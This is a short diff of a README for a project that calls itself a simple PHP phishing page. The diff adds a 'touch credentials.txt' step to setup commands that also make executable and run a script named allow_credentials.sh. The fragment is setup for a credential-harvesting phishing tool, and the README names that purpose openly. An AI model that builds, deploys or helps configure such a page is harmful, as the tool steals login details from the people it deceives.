@@ -4,6 +4,7 @@ A simple phishing Page using php
 
 - Full permission to credentials.txt
 ```shell
+touch credentials.txt
 sudo chmod u+x config/allow_credentials.sh
 ./config/allow_credentials.sh
 ```
